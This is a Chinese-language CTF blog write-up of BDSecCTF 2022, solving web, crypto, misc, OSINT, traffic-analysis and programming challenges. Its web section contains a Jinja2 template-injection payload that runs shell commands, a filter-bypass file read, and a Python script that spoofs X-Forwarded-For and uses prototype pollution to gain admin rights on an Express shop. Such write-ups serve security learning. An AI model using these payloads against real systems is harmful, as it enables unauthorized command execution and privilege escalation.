---
title: BDSecCTF
date: 2022-07-22 00:11:58
tags: 
       - 赛后复盘
       - CTF
categories: 
       - [赛后复盘]
       - [CTF]
---

![image-20220721230519190](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207212305269.png?x-oss-process=hzy)

<!--more-->

--------------------



# 前言

这个国外的比赛我自己认为比较面向新手吧，但是我依然不能全做出来，继续努力继续努力

# Web

## Jungle Templating

![image-20220721184455566](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207211845506.png?x-oss-process=hzy)

初步判断是SSTI，会得出运算结果

![image-20220721184551241](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207211845309.png?x-oss-process=hzy)

查看配置文件情况

![image-20220721184627928](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207211846030.png?x-oss-process=hzy)

```
{{cycler.next.__globals__.os.popen('nl *')|max}}
```

![image-20220721185115064](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207211851131.png?x-oss-process=hzy)

BDSEC{Y3Y_7H1515_7H3_F146}

## Awesome Note Keeping

![image-20220721235630128](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207212356207.png?x-oss-process=hzy)

写笔记，试试呗，传个xss弹窗，发现是可以的，但是不存cookie应该也找不到啥东西，放弃这个思路

![image-20220721235816295](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207212358361.png?x-oss-process=hzy)

看源码得到一行提示

```
Hi Seli, I have created this awesome note keeping web app today. I have saved a backup file index.php.bak for you. Download it and check it out. 
```

源码路径，打包下来审计，主要代码如下

```
    <?php
    ini_set('display_errors', 1);
    ini_set('display_startup_errors', 1);
    error_reporting(E_ALL);
    if (isset($_POST["note"]) && isset($_POST["note_title"])) {
        if (empty($_POST["note"]) || empty($_POST["note_title"])) {
            echo "All fields are required.";
        } else if (strlen($_POST["note_title"]) >= 13) {
            echo "Note title is too long.";
        } else if (strlen($_POST["note"]) >= 40) {
            echo "Note is too long.";
        } else {
            $note_title = str_replace("flag", "", $_POST["note_title"]);
            if (!empty($note_title)) {
                if (file_exists($note_title . ".txt")) {
                    echo "There is already a note with that title and the note is <br>";
                    $note_title = str_replace("flag", "", $note_title);
                    $myNote = fopen($note_title . ".txt", "r");
                    echo fread($myNote, filesize($note_title . ".txt"));
                    fclose($myNote);
                } else {
                    $myNote = fopen($note_title . ".txt", "w");
                    fwrite($myNote, $_POST["note"]);
                    fclose($myNote);
                    echo "Your note has been saved.";
                }
            } else {
                echo "Sorry ! You can't create flag note.";
            }
        }
    }


    if (isset($_GET["note_title"]) && !empty($_GET["note_title"]) && $_GET["note_title"] != "flag") {
        if (file_exists($_GET["note_title"] . ".txt")) {
            $myNote = fopen($_GET["note_title"] . ".txt", "r");
            echo fread($myNote, filesize($_GET["note_title"] . ".txt"));
            fclose($myNote);
        } else {
            echo "Sorry ! Couldn't find any note with that title.";
        }
    }

    ?>
```

贼长，还得绕，看的我头疼，浅浅分析一下，note和note_title这俩变量都是post传参，对应的就是那两个填的内容，然后对传的内容进行了校验和长度的控制，其次就是这下面这个函数

> str_replace() 函数
>
> str_replace() 函数以其他字符替换字符串中的一些字符（区分大小写）。
>
> 例如：把字符串 "Hello world!" 中的字符 "world" 替换为 "Shanghai"：
>
> ```
> <?php
> echo str_replace("world","Shanghai","Hello world!");
> ?>
> ```

说实话得到flag的过程挺让我意外，目录穿越？？？，当时我看到当查询一个文件的时候payload会变成`?note_title=1`，然后我有测试../../../etc/passwd，但是没有反应我就没管目录穿越，现在知道了这个验证方式不是唯一的

这道题目最终就是在本目录下直接读取flag，但是直接读肯定不行，因为会被替换成空格，所以payload如下

```
?note_title=./flag
```

![image-20220722000918653](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207220009717.png?x-oss-process=hzy)

BDSEC{tHe_n0t3_K33p1n6_4W350M3_N5}

## Knight Squad Shop

![image-20220721230949109](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207212309198.png?x-oss-process=hzy)

这是一个，附件代码审计

初步查看也能知道这是个商店，可以购买东西，然后初始钱是一百，我们的目标就是那个Get flags，显然直接购买是不行的。

源码我先全部贴到这，慢慢分析

```
const express = require('express')
const session = require('express-session')
const fs = require('fs')

const app = express()

const products = require('./product.json')


const product = {
    name: 'Some Product',
    price: 100,
    description: 'A description of the product',
    quantity: 1,
};

products['flags'] = {     // 这个就是我们最终要购买的产品，我在这里被坑了一波，好久才反应过来
    name: 'Get flags',
    price: 2.5e+25,    // 它的价格，显然直接买不起
    description: fs.readFileSync('flag.txt', 'utf8').trim(),     // 内容就是这个flag.txt
    quantity: 1     // 数量是一个
}

app.use(express.json({ extended: true }));
app.set('view engine', 'ejs');

app.use(session({
    secret: require('crypto').randomBytes(64).toString('hex'),
    resave: false,
    saveUninitialized: true,
}));

app.use((req, res, next) => {
    if(req.session.money !== undefined) {
        return next();
    }
    req.session.money = 100;   //  初始值是100

    if (req.ip == '127.0.0.1') {    // 需要本地，这里想到的是加个XFF头来进行绕过
        req.session.admin = true;
    }
    next();
});

app.get('/', (req, res) => {    // 路由
    res.render('index', { products, money: req.session.money})
})

app.post('/api/v1/sell', (req, res) => {   // 路由。功能就是sell
    for (const [key, value] of Object.entries(req.body)) {
        if (key === 'flags' && !req.session.admin) {
            continue;
        }

        if (!products[key]) {
            products[key] = JSON.parse(JSON.stringify(product));
        }

        for (const [k, v] of Object.entries(value)) {
            if (k === 'quantity') {
                products[key][k] += v;
            } else {
                products[key][k] = v;
            }
        }
    }

    res.send('Sell successful');
});

app.post('/api/v1/buy', (req, res) => {   // 路由，功能是buy
    const { product, quantity } = req.body;

    if (typeof product === 'undefined' || typeof quantity !== 'number' || quantity <= 0 || !products[product]) {
        return res.status(400).send('Invalid request');
    }

    if (products[product].quantity >= quantity) {
        if (req.session.money >= products[product].price * quantity) {
            products[product].quantity -= quantity;
            req.session.money -= products[product].price * quantity;
            res.json(products[product]);
        } else {
            res.status(402).send('Not enough money');
        }
    } else {
        res.status(451).send('Not enough product');
    }
});

app.post('/api/v1/money', (req, res) => {   //路由，功能是管理money的加减，这里需要是admin，否则没权限
    if (req.session.admin) {  // 判断是否是admin
        req.session.money += req.body.money;
        res.send('Money added');
    } else {
        res.status(403).send('Not admin');
    }
});

app.listen(3000, () => {
    console.log('Listening on port 3000');
});
```

下面单拉出一个路由来分析---sell

```
app.post('/api/v1/sell', (req, res) => {   // 路由。功能就是sell
    for (const [key, value] of Object.entries(req.body)) {
        if (key === 'flags' && !req.session.admin) {
            continue;
        }

        if (!products[key]) {
            products[key] = JSON.parse(JSON.stringify(product));
        }

        for (const [k, v] of Object.entries(value)) {
            if (k === 'quantity') {
                products[key][k] += v;
            } else {
                products[key][k] = v;
            }
        }
    }

    res.send('Sell successful');
});
```

这个就是出售的功能，不仅可以买还可以卖，但是我们可以看到它不允许卖flag，只要卖flag就直接跳了，相当于把flag这个产品给拦截了。

然后就是管理钱的那个路由，刚才也说到了，只能是admin才可以有权限。XFF头就可以实现admin，在这样的情况下我测试了，可以一直卖，但是没有收益，毫无用处，继续分析

```

        for (const [k, v] of Object.entries(value)) {
            if (k === 'quantity') {
                products[key][k] += v;
            } else {
                products[key][k] = v;
            }
        }
```

这个是控制数量的，每个产品的数量，可以看到quantity是可以根据v写入数据的，说明我们可以讲产品价格改成任意值

在购买的时候有个条件

```
if (req.session.money >= products[product].price * quantity) {
            products[product].quantity -= quantity;
```

这个if条件是说明你买啥就会扣你的钱来进行，不严格，简单来讲就是你把价格调成负数，你越买，钱越多

整体分析就是这样，思路就来了，我们可以先卖，卖的价格为负数，然后再买自己卖的，这样钱就够了，然后再买flag

写个脚本传一下吧

```
import requests

s = requests.Session()

print(s.post('http://206.189.236.145:3000/api/v1/sell', headers={'X-Forwarded-For': '127.0.0.1'}, json={'__proto__': {'admin': 'gg'}, 'mango': { 'quantity': 1 }}).text)  //  卖
print(s.post('http://206.189.236.145:3000/api/v1/money',json={ 'money': 2.5e+25 + 1 }).text)   //买
print(s.post('http://206.189.236.145:3000/api/v1/buy', json={ 'product': 'flags', 'quantity': 1 } ).json()['description'])   // 买
```

最终成功实现，得到flag

![image-20220721233640644](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207212336720.png?x-oss-process=hzy)

BDSEC{mummy_i_can't_write_javaScript}

> 至于我说到的我刚才被难到的地方是我一直把产品当成Get flags，脚本一直报错最后一步买flag的地方，也是因为代码审计不认真，毕竟代码说的很清楚，以后主要代码一定要认真看![image-20220721233917609](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207212339662.png?x-oss-process=hzy)

# Networking

## Victim & Attacker

流量分析，最终确定一个流量是攻击流量

![image-20220721194405112](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207211944182.png?x-oss-process=hzy)

![image-20220721194422016](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207211944075.png?x-oss-process=hzy)

服务器ip是192.168.1.13

攻击者ip是192.168.1.10

BDSEC{192.168.1.13_192.168.1.10}

# Misc

## Find Me Inside

> I'm stuck in the Dark.

下载附件是个gif动图

![image-20220721211040441](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207212110546.png?x-oss-process=hzy)

隐藏了压缩包，改类型，解压得到cry100

![image-20220721211130360](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207212111431.png?x-oss-process=hzy)

```
Sld xlfow R yv hl olhg
Rm z kozxv R pmld hl dvoo?
Sld xlfow R yv hl yilpvm
Rm z uznrob hl gltvgsvi?
Sld xlfow R yv hl olmvob
Hfiilfmwvw yb hl nzmb?
Sld xlfow R yv hl fmszkkb
Hfiilfmwvw yb hl nfxs yvzfgb?
Sld xlfow R yv nv
Dsvm vevm R ivnzrm z nbhgvib?
YWHVX{N33n_gsv_yfggviuob_tlvh_fk_fk_zmw_zdzb}
```

Atbash解密，得到flag



```
how could i be so lost
in a place i know so well?
how could i be so broken
in a family so together?
how could i be so lonely
surrounded by so many?
how could i be so unhappy
surrounded by so much beauty?
how could i be me
when even i remain a mystery?
bdsec{m33m_the_butterfly_goes_up_up_and_away}
// BDSEC{M33m_the_butterfly_goes_up_up_and_away}
```

# Cryptography

## VIPx01

> My friend gave me his game username and game id . Can decode game id ?
>
> User : rot
>
> Game ID : OQFRP{pelcg0_ne3_nj3f0z3}
>
> Flag Format : BDSEC{s0m3thing_here}

rot13解密

BDSEC{crypt0_ar3_aw3s0m3}

## 基本上是 RSA

> RSA cryptosystem uses modular arithmetic to create an asymmetric encryption system. However, there are some pitfalls and weakness. Can you exploit it?
>
> > N: 1280678415822214057864524798453297819181910621573945477544758171055968245116423923
> >
> > E: 65537
> >
> > C: 241757357533719849989659127349827982677055294256023833052829147857534659015212862

RSAtool，工具一把梭

BDSEC{r54_i5_fUn_r16h7?}

# OSINT

## Find Rejvi

> I just met a girl named Rejvi Khan. She told me to find her in social media. I searched on Facebook but didn't find her. I think she is using any other social media. Can you find her ?
>
> Flag format : BDSEC{s0mething_here}

就是搜这个人，各种社交软件都搜搜，最终锁定mastodon

![image-20220722003759533](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207220037687.png?x-oss-process=hzy)

扫码得到flag

![image-20220722003926823](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207220039982.png?x-oss-process=hzy)

BDSEC{yoU_goT_m3__oS1nT_I5_fUn_r1Gh7}

# Programming

## Find the Cost

> Assume every node as a city. Find the cost of the shortest yet most efficient & the longest and most inefficient route for a person to travel each city exactly once and return to the origin city.
>
> Flag Format: BDSEC{minimum_cost,maximum_cost}
>
> Flag Example: BDSEC{12,89}
>
> 

这个题目就是找最短路径最省钱和最长路径最费钱的俩种方案

![image-20220722004448243](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202207220044344.png?x-oss-process=hzy)

有很多种解法，可以花树状图进行分析

最终结果，最少花费35，最多花费47

flag为BDSEC{35,47}

# 总结

CTF比赛考察点还是比较多的，学习的时候也是比较广，比较杂，就要靠平时多学多积累，比赛多参加，还有就是最重要的审计代码，沉下心来，做题一定要沉下心来，要不然就会丢失很多分，收工！